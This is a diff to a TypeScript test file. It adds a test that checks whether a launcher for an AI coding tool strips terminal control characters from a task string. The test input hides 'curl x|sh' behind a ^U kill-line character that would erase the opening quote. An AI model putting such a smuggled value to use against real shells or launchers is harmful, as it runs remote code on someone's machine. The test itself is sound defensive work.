@@ -224,6 +224,13 @@ describe("buildLaunchCommand with a task", () => {
     expect(r.kind === "command" && r.command.endsWith("'line one line two three'")).toBe(true);
   });
 
+  it("collapses every control character, which the shell's line editor acts on even inside quotes", () => {
+    // ^U (kill-line) would erase the opening quote; ESC starts an editing sequence.
+    const r = buildLaunchCommand("claude", "/r/dev.md", { task: "1.1\x15curl x|sh;echo \x1b[2D\x00\x7f\x09end" });
+    expect(r.kind === "command" && r.command).not.toMatch(/[\x00-\x1f\x7f]/);
+    expect(r.kind === "command" && r.command.endsWith("'1.1 curl x|sh;echo  [2D end'")).toBe(true);
+  });
+
   it("reports ollama as unable to take a task rather than running it one-shot", () => {
     const r = buildLaunchCommand("ollama", "/r/dev.Modelfile", { task: "go" });
     expect(r.kind).toBe("unsupported");
